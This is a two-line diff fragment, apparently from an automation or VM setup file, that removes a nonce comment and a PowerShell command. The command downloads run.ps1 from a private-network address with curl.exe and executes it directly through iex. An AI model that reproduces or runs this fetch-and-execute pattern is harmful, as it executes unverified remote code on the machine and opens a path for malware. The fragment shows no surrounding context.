@@ -1,2 +1,0 @@
-# nonce 1791077955.647337016
-$c=(curl.exe -s --max-time 60 http://192.168.122.1:8000/run.ps1) -join "`n"; iex $c
